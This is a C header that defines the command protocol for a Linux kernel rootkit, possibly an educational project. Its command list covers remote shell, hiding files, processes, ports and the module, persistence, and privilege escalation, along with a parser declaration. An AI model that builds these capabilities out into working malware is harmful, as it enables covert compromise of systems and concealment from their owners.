/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKITLINGS_PROTOCOL_H
#define ROOTKITLINGS_PROTOCOL_H

#ifdef __KERNEL__
#include <linux/types.h>
#else
#include <stddef.h>
#include <stdint.h>
typedef uint16_t u16;
#endif

#define RK_HIDE_VALUE_MAX 64

enum rk_command_kind {
	RK_COMMAND_INVALID,
	RK_COMMAND_PING,
	RK_COMMAND_INFO,
	RK_COMMAND_STATUS,
	RK_COMMAND_SHELL,
	RK_COMMAND_SHELL_STATUS,
	RK_COMMAND_QUIT,
	RK_COMMAND_HIDE_FILE,
	RK_COMMAND_HIDE_PID,
	RK_COMMAND_HIDE_CONTENT,
	RK_COMMAND_HIDE_PORT,
	RK_COMMAND_UNHIDE_FILE,
	RK_COMMAND_UNHIDE_PID,
	RK_COMMAND_UNHIDE_CONTENT,
	RK_COMMAND_UNHIDE_PORT,
	RK_COMMAND_UNHIDE_ALL,
	RK_COMMAND_LIST_FILE,
	RK_COMMAND_LIST_PID,
	RK_COMMAND_LIST_CONTENT,
	RK_COMMAND_LIST_PORT,
	RK_COMMAND_PERSIST,
	RK_COMMAND_HIDE_MODULE,
	RK_COMMAND_UNHIDE_MODULE,
	RK_COMMAND_ESCALATE,
	RK_COMMAND_MARK,
	RK_COMMAND_ENABLE,
	RK_COMMAND_DISABLE,
	RK_COMMAND_RUN,
};

struct rk_command {
	enum rk_command_kind kind;
	u16 shell_port;
	char hide_value[RK_HIDE_VALUE_MAX];
	size_t hide_value_length;
	unsigned int unhide_index;
	unsigned int escalate_pid;
	char mark_value[RK_HIDE_VALUE_MAX];
	size_t mark_value_length;
	unsigned int list_index;
	int list_has_index;
};

int rk_command_parse(const unsigned char *bytes, size_t length,
		     struct rk_command *command);
unsigned int rk_retry_next(unsigned int current_ms, unsigned int base_ms,
			   unsigned int maximum_ms);

#endif
